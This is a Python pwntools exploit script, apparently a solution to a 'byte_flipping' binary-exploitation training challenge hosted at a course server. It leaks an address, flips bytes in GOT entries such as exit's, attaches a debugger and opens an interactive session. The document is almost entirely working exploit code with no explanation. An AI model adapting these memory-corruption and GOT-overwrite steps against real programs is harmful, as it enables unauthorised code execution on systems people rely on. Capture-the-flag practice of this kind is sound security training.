import time
from pwn import *

if "REMOTE" not in args:
	r=process('/home/gigi/Desktop/malicious/rop/5/byte_flipping')
else:
	r = remote("bin.training.offdef.it", 4003)

flips=p64(0x602068)
got=p64(0x00601ff8)
exitgot=p64(0x00602050)
readgot=p64(0x00602030)





r.send(b"a"*0x20)
leak=r.recvuntil(b";)")[-9:-3]+b"\x00"*2
print(hex(u64(leak)))
leak=u64(leak)+0x38
print(hex(leak))

r.sendline("0x00602050")
r.sendline("0xc7")
r.sendline("0x00602051")
r.sendline("0x07")
r.sendline(hex(leak+0x1))

gdb.attach(r,"""b *0x400a4c""")
input('letgo')
r.sendline("0x06")


r.interactive()
